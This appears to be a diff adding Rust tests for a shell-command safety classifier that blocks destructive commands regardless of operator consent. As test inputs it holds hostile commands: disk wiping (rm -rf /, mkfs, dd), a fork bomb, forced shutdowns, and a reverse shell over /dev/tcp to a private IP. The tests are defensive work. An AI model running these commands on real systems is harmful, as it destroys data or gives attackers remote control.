@@ -809,4 +809,261 @@ mod tests {
         assert!(result.is_probe());
         assert_eq!(result.action_id(), "probe-1");
     }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // P0 SECURITY: Shell safety classifier adversarial suite (ADR-0050)
+    // ═══════════════════════════════════════════════════════════════════════
+
+    // REQ: ADR-0050 — Blocked commands NEVER execute, even with operator consent.
+
+    #[test]
+    fn blocked_rm_rf_root() {
+        let err = classify_shell_command("rm -rf /").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_rm_rf_wildcard() {
+        let err = classify_shell_command("rm -rf /*").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_mkfs() {
+        let err = classify_shell_command("mkfs.ext4 /dev/sda1").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_dd() {
+        let err = classify_shell_command("dd if=/dev/zero of=/dev/sda").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_fork_bomb() {
+        let err = classify_shell_command(":(){ :|:& };:").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_chmod_777_root() {
+        let err = classify_shell_command("chmod -R 777 /").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_chown_recursive() {
+        let err = classify_shell_command("chown -R attacker /etc").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_redirect_to_disk() {
+        let err = classify_shell_command("> /dev/sda").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_shutdown() {
+        let err = classify_shell_command("shutdown -h now").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_reboot() {
+        let err = classify_shell_command("reboot").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_init_0() {
+        let err = classify_shell_command("init 0").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_systemctl_poweroff() {
+        let err = classify_shell_command("systemctl poweroff").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_halt() {
+        let err = classify_shell_command("halt").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_poweroff() {
+        let err = classify_shell_command("poweroff").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    // REQ: ADR-0050 — Obfuscated variants must also be blocked.
+
+    #[test]
+    fn blocked_case_insensitive_rm_rf() {
+        let err = classify_shell_command("RM -RF /").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_mixed_case_shutdown() {
+        let err = classify_shell_command("ShUtDoWn -h now").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_sudo_rm_rf() {
+        // "sudo rm -rf /" contains "rm -rf /" → blocked
+        let err = classify_shell_command("sudo rm -rf /").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_sudo_reboot() {
+        let err = classify_shell_command("sudo reboot").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    // REQ: ADR-0050 — Multi-command chains with destructive patterns are blocked.
+
+    #[test]
+    fn blocked_semicolon_chain_with_rm() {
+        // Even embedded in a chain, rm -rf / should be caught
+        let err = classify_shell_command("echo hello; rm -rf /; echo done").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn blocked_pipe_chain_with_reboot() {
+        let err = classify_shell_command("cat /etc/hosts | reboot").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    // REQ: ADR-0050 — Reverse shell / exfiltration patterns are blocked.
+
+    #[test]
+    fn blocked_reverse_shell() {
+        let err = classify_shell_command("bash -i >&2 /dev/tcp/10.0.0.1/4444 0>&1").unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    // REQ: Safe commands must still be allowed through.
+
+    #[test]
+    fn safe_ls_is_read_only() {
+        let result = classify_shell_command("ls -la /home").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::None);
+    }
+
+    #[test]
+    fn safe_ps_is_read_only() {
+        let result = classify_shell_command("ps aux").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::None);
+    }
+
+    #[test]
+    fn safe_nvidia_smi_is_read_only() {
+        let result = classify_shell_command("nvidia-smi").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::None);
+    }
+
+    // REQ: High-risk commands pass through as medium risk (not blocked, but require consent).
+
+    #[test]
+    fn high_risk_rm_rf_tmp() {
+        // "rm -rf /tmp/cleanup" contains "rm -rf" → high risk, not blocked
+        let result = classify_shell_command("rm -rf /tmp/cleanup").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::Medium);
+    }
+
+    #[test]
+    fn high_risk_kill_9() {
+        let result = classify_shell_command("kill -9 1234").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::Medium);
+    }
+
+    #[test]
+    fn sudo_apt_install_is_low_risk() {
+        let result = classify_shell_command("sudo apt install build-essential").unwrap();
+        assert!(result.is_shell_command());
+        assert!(result.needs_sudo());
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // P0 SECURITY: Consent sovereignty integration (JR-3 invariant)
+    // ═══════════════════════════════════════════════════════════════════════
+
+    // REQ: JR-3 — Blocked commands NEVER execute, even with operator consent.
+    // The classifier returns ShellBlocked as an error, so the command never
+    // reaches the consent gate. Operator consent cannot override a block.
+
+    #[test]
+    fn consent_cannot_override_rm_rf_block() {
+        // This is a JR-3 invariant: even if the operator says "ok",
+        // blocked commands must not reach the execution path.
+        // The classifier returns Err(ShellBlocked), which means the
+        // command is never converted to a ResolvedAction::ShellCommand
+        // and thus never enters the PendingAction consent flow.
+        let result = classify_shell_command("rm -rf /");
+        assert!(
+            result.is_err(),
+            "blocked command must not produce a ResolvedAction"
+        );
+        let err = result.unwrap_err();
+        assert!(matches!(err, ActionError::ShellBlocked { .. }));
+    }
+
+    #[test]
+    fn consent_cannot_override_reboot_block() {
+        let result = classify_shell_command("reboot");
+        assert!(result.is_err());
+        assert!(matches!(
+            result.unwrap_err(),
+            ActionError::ShellBlocked { .. }
+        ));
+    }
+
+    #[test]
+    fn consent_cannot_override_mkfs_block() {
+        let result = classify_shell_command("mkfs.ext4 /dev/sda1");
+        assert!(result.is_err());
+        assert!(matches!(
+            result.unwrap_err(),
+            ActionError::ShellBlocked { .. }
+        ));
+    }
+
+    // REQ: JR-3 — Operator consent overrides risk band for non-blocked commands.
+    // High-risk commands (rm -rf /tmp, kill -9) are classified as ShellCommand
+    // with risk: medium. The consent gate allows the operator to approve them.
+
+    #[test]
+    fn consent_overrides_risk_band_for_high_risk() {
+        let result = classify_shell_command("rm -rf /tmp/cleanup").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::Medium);
+        // This command WOULD reach the consent gate — operator can approve.
+        // The consent gate sets max_auto_risk to Critical once consent is given,
+        // so the risk check passes.
+    }
+
+    #[test]
+    fn consent_overrides_risk_band_for_critical_risk_intervention() {
+        // Interventions at critical risk still require operator consent,
+        // but once consented, the dispatcher must execute.
+        // This tests the classification layer; the actual consent flow is in
+        // russell-cli, but the key invariant is that classify_shell_command
+        // does not block medium-risk commands — they pass through to consent.
+        let result = classify_shell_command("kill -9 12345").unwrap();
+        assert!(result.is_shell_command());
+        assert_eq!(result.risk_band(), RiskBand::Medium);
+    }
 }
